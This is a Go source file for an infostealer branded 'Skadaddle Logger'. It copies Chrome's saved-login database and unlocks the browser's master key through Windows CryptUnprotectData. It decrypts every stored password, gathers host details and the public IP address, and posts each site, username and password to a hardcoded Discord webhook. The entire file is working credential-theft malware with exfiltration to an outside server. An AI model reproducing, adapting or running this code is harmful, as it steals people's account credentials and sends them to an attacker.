package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ahmedkamals/colorize"
	_ "github.com/mattn/go-sqlite3"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
	"github.com/tidwall/gjson"
)

func HandleErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	colorized := colorize.NewColorable(os.Stdout)
	println(colorized.White("			┌┼┐  ╦╔═  ╔═╗  ╔╦╗  ╔═╗  ╔╦╗  ╔╦╗  ╦    ╔═╗"))
	println(colorized.Gray("			└┼┐  ╠╩╗  ╠═╣   ║║  ╠═╣   ║║   ║║  ║    ║╣"))
	println(colorized.Purple("			└┼┘  ╩ ╩  ╩ ╩  ═╩╝  ╩ ╩  ═╩╝  ═╩╝  ╩═╝  ╚═╝"))

	if !checkFileExist(dataExtractPath) {
		os.Exit(0)
	}

	dataSourceFile, err := os.Open(dataExtractPath)
	HandleErr(err)
	defer dataSourceFile.Close()

	destSourceFile, err := os.Create(dataLogPath)
	HandleErr(err)
	defer destSourceFile.Close()

	_, err = io.Copy(destSourceFile, dataSourceFile)
	HandleErr(err)

	//Open Database
	db, err := sql.Open("sqlite3", dataLogPath)
	HandleErr(err)
	defer db.Close()

	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	HandleErr(err)
	defer rows.Close()

	resp, err := http.Get("http://api.ipify.org")
	HandleErr(err)
	defer resp.Body.Close()

	readBody, err := ioutil.ReadAll(resp.Body)
	HandleErr(err)

	for rows.Next() {
		var (
			url_value      string
			username_value string
			password_value string
		)

		err = rows.Scan(&url_value, &username_value, &password_value)
		HandleErr(err)

		//Decrypt Passwords
		if !strings.HasPrefix(password_value, "v10") {
			continue
		}

		password_value = strings.Trim(password_value, "v10")

		if string(masterKey) == "" {
			masterKey, err = getMasterKey()
			HandleErr(err)
		}

		ciphertext := []byte(password_value)
		c, err := aes.NewCipher(masterKey)
		HandleErr(err)

		gcm, err := cipher.NewGCM(c)
		HandleErr(err)

		nonceSize := gcm.NonceSize()
		if len(ciphertext) < nonceSize {
			fmt.Println("nonce size is smaller than ciphertext")
		}

		nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		HandleErr(err)

		var (
			cpuStat, _  = cpu.Info()
			diskStat, _ = disk.Usage("\\")
			hostStat, _ = host.Info()
			vmStat, _   = mem.VirtualMemory()
		)

		webhook := webhookData{
			AvatarURL: "https://cdn.discordapp.com/icons/815155331348561920/21196648e3ba3233020ad2ab27efac0f.png?size=1024",
			Username:  "Skadaddle",

			Embeds: []*webhookEmbed{
				{
					Author: &embedAuthor{Name: fmt.Sprintf("%s's info", hostStat.Hostname)},
					Color:  000001,

					Fields: []*embedField{
						{Name: "**__Website__**", Value: url_value, Inline: true},
						{Name: "**__Username__**", Value: username_value, Inline: true},
						{Name: "**__Password__**", Value: string(plaintext), Inline: true},
						{Name: "**__Platform__**", Value: hostStat.Platform, Inline: true},
						{Name: "**__Cpu__**", Value: cpuStat[0].ModelName, Inline: true},
						{Name: "**__Ram__**", Value: fmt.Sprint(vmStat.Total / 1024 / 1024), Inline: true},
						{Name: "**__DiskSpace__**", Value: fmt.Sprint(diskStat.Total / 1024 / 1024), Inline: true},
						{Name: "**__Skadaddle Website__**", Value: "https://skadaddle.cc", Inline: true},
						{Name: "**__Server__**", Value: "https://discord.gg/Y2yxAVnj3n", Inline: true},
						{Name: "**__IP Address__**", Value: string(readBody)},
					},

					Footer: &embedFooter{Text: "Skadaddle Logger", IconURL: "https://cdn.discordapp.com/icons/815155331348561920/21196648e3ba3233020ad2ab27efac0f.png?size=1024"},
					Image: &embedImage{
						URL: "https://images-ext-1.discordapp.net/external/7XyUx7KFZfUUREJ30XCk1GtNIxGR6j9XXWO6xHAUOxc/https/skadaddle.cc/img/skadaddle.gif",
					},

					Timestamp: time.Now().UTC().Format("2006-01-02T15:04:05-0700"),
				},
				// next embed
			},
		}

		encodedData, err := json.Marshal(webhook)
		HandleErr(err)

		http.Post("https://discord.com/api/webhooks/829371581235068986/vUYQNCeftPwLPiWZoBTTMFgtR4aSLhSop4mIaRKYGHOAePHsWYQnVJScogaaADio2fBB", "application/json", bytes.NewBuffer(encodedData))
	}
}

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	}

	return true
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB

	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))

	return outblob.ToByteArray(), nil
}

func getMasterKey() ([]byte, error) {
	var masterKey []byte

	jsonFile, err := os.Open(dataKeyPath)
	if err != nil {
		return masterKey, err
	}
	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}

	encryptedKey := gjson.Get(string(byteValue), "os_crypt.encrypted_key")
	if encryptedKey.Exists() {
		decodedKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
		if err != nil {
			return masterKey, err
		}

		masterKey, err = Decrypt(decodedKey[5:])
		if err != nil {
			return masterKey, err
		}
	}

	return masterKey, nil
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}

	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)

	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])

	return d
}

var (
	dataExtractPath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	dataKeyPath     string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	dataLogPath     string = os.Getenv("TEMP") + "\\tempfile.dat"

	dllcrypt32  *syscall.LazyDLL = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 *syscall.LazyDLL = syscall.NewLazyDLL("Kernel32.dll")

	masterKey []byte

	procDecryptData *syscall.LazyProc = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   *syscall.LazyProc = dllkernel32.NewProc("LocalFree")
)

type (
	DATA_BLOB struct {
		cbData uint32
		pbData *byte
	}

	webhookData struct {
		AvatarURL string          `json:"avatar_url,omitempty"`
		Embeds    []*webhookEmbed `json:"embeds,omitempty"`
		Username  string          `json:"username,omitempty"`
	}

	webhookEmbed struct {
		URL       string        `json:"url,omitempty"`
		Timestamp string        `json:"timestamp,omitempty"`
		Color     int           `json:"color,omitempty"`
		Footer    *embedFooter  `json:"footer,omitempty"`
		Image     *embedImage   `json:"image,omitempty"`
		Author    *embedAuthor  `json:"author,omitempty"`
		Fields    []*embedField `json:"fields,omitempty"`
	}

	embedAuthor struct {
		Name string `json:"name,omitempty"`
	}

	embedField struct {
		Name   string `json:"name,omitempty"`
		Value  string `json:"value,omitempty"`
		Inline bool   `json:"inline,omitempty"`
	}

	embedFooter struct {
		Text    string `json:"text,omitempty"`
		IconURL string `json:"icon_url,omitempty"`
	}

	embedImage struct {
		URL string `json:"url,omitempty"`
	}
)
